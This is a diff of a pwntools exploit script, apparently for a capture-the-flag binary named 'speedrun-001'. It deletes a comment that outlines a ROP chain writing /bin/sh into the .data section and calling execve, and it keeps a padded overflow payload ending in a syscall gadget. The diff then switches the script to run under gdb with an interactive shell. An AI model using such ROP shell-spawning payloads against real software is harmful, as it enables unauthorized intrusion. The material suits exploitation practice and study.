@@ -5,19 +5,9 @@ binary = "./speedrun-001"
 pwn.context.binary = binary
 pwn.context.encoding = "latin"
 
-'''
-Exploit:
- use write primitive to write /bin/sh to .data section
- call execve on the .data section 
-Pseudo-Code:
- pop rax ret
- data section
- pop rdx ret
- /bin/sh
- mov qword ptr rax rdx
- pop rdi 
- 0
-'''
+gdbscript = ""
+with open("breakpoints.gdb", "r") as io:
+    gdbscript = io.read()
 
 padding = 1032
 gadgets = {
@@ -49,18 +39,6 @@ payload = pwn.flat(
     pwn.p64(gadgets["syscall_ret"])
 )
 
-if ("input" in sys.argv):
-    with open("input", "wb") as io:
-        io.write(payload)
-
-if ("log" in sys.argv):
-    pwn.context.log_level = "debug"
-
-with pwn.process(binary) as io:
-    pwn.info(io.readrepeat(1))
+with pwn.gdb.debug(binary, gdbscript=gdbscript) as io:
     io.send(payload)
-    if ("interactive" in sys.argv):
-        io.interactive()
-
-    if ("output" in sys.argv):
-        pwn.info(io.readrepeat(1))
+    io.interactive()
